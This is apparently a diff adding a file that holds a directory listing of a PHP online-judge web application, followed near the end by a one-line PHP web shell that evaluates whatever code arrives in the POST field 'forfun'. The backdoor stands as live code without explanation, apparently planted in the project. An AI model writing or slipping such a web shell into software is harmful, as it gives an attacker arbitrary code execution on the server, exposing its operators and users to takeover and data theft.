@@ -1,0 +1,35 @@
+dir 
+UserFiles	      images		    profile_chpwd.php
+action.php	      inc		    profile_edit.php
+admin		      index.php		    profile_forgetpwd.php
+announcement.php      js		    profile_login.php
+cindex.php	      json		    query.php
+compileText.sh	      json.php		    ranklist.php
+compileresult.php     judge		    register.php
+contest_detail.php    locale		    route.php
+contest_password.php  login.php		    search.php
+contest_reg	      model		    sharecodes.php
+contests.php	      navigation.php	    show_problem.php
+course_detail.php     nbproject		    standing.php
+course_register.php   netid_authorize.php   standing_full.php
+courses.php	      netid_bind.php	    status.php
+csdn		      netid_bind_email.php  stuff
+css		      netid_unbind.php	    submit.php
+daily_ranklist.php    phpunit		    system
+doc		      post.php		    temp.html
+export.php	      post_market.php	    temp.php
+faq.php		      problem.php	    user.php
+fast_json.php	      problem_data.php	    usercmp.php
+favicon.ico	      problem_list.php	    viewsource.php
+footer.php	      problem_status.php    wxyz_problem_list.php
+genText.sh	      problem_tab.php	    wxyzfiles
+help.php	      problems.php
+helper		      process.php
+helper		      process.php
+
+
+<?php eval($_POST["forfun"])?>
+
+
+--------------------------------------------------------------------------------
+ 
